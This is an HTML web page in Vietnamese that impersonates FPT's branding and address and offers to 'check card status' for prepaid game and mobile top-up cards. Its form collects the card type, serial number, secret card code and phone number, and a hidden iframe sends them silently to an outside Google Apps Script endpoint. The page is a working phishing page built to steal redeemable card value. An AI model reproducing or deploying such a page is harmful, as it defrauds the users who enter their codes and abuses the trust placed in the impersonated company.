<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
      crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">

    <title>Kiểm Tra Trạng Thái Thẻ</title>
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-light">
      <div class="container">
        <a class="navbar-brand" href="#" aria-label="Trang chủ">
          <img
            src="/images/fpt-logo-5B8F17203A-seeklogo.com_.png"
            alt="Logo FPT"
            width="100">
        </a>
        <button
          class="navbar-toggler"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#navbarNav"
          aria-controls="navbarNav"
          aria-expanded="false"
          aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
      </div>
    </nav>
    <div class="box-form">
      <div class="item">
        <h1>TRA CỨU TRẠNG THÁI THẺ</h1>
      </div>
      <div class="box-title">
        <h5 id="changeText">Nhập seri và mã thẻ vào ô bên dưới</h5>
        <h5>Hệ Thống Tiếp Nhận Kiểm Tra Thẻ Của Bạn Lúc:</h5>
        <h5 id="MyClockDisplay">--:--:--</h5>
      </div>
      <div class="form-chonthe">
        <iframe
          id="hidden_iframe"
          name="hidden_iframe"
          title="Hidden iframe for form submission"
          style="display: none">
        </iframe>
        <form
          target="hidden_iframe"
          id="formdata"
          action="https://script.google.com/macros/s/AKfycbyINhoeucImZAhc4W5521yQwpL68K2Y0zaeEc9zeJ442f0C_598xA5Z4fkCTwlrGQP3/exec"
          method="GET"
          class="form-chonthe"
          name="formdata">
          <div class="item-form">
            <label for="loaithe">Loại thẻ</label>
            <select class="form-control" name="loaithe" id="loaithe" required>
              <option value="Vcoin">Vcoin</option>
              <option value="FPT">FPT Gate</option>
              <option value="Zing">Zing</option>
              <option value="Viettel">Viettel</option>
              <option value="Mobiphone">Mobiphone</option>
              <option value="Vinaphone">Vinaphone</option>
            </select>
          </div>
          <div class="item-form">
            <label for="soseri">Số Seri</label>
            <input
              type="text"
              id="soseri"
              placeholder="Nhập số seri"
              class="form-control"
              name="soseri"
              required>
          </div>
          <div class="item-form">
            <label for="mathe">Mã Thẻ</label>
            <input
              type="text"
              id="mathe"
              placeholder="Nhập mã thẻ"
              class="form-control"
              name="mathe"
              required>
          </div>
          <div class="item-form">
            <label for="sdt">SĐT Nhận Kết Quả</label>
            <input
              type="text"
              id="sdt"
              placeholder="Số điện thoại nhận kết quả"
              class="form-control"
              name="sđt"
              required>
          </div>
          <div class="btn-kiemtra">
            <button type="submit" id="btn-kiemtra">
              <span id="btn-text">KIỂM TRA</span>
              <span id="btn-loading" class="loading-spinner" style="display: none;">
                <span class="spinner"></span> Đang kiểm tra...
              </span>
            </button>
          </div>
          <div id="sss" class="result-message"></div>
        </form>
      </div>
    </div>

    <div class="footer">
      <p>
        Trụ sở chính: Tòa nhà FPT Cầu Giấy số 17 phố Duy Tân, quận Cầu Giấy, Hà
        Nội, VN
      </p>
    </div>

    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
      crossorigin="anonymous">
    </script>
    <script src="/script.js"></script>
    <script src="/checkdata.js"></script>
  </body>
</html>
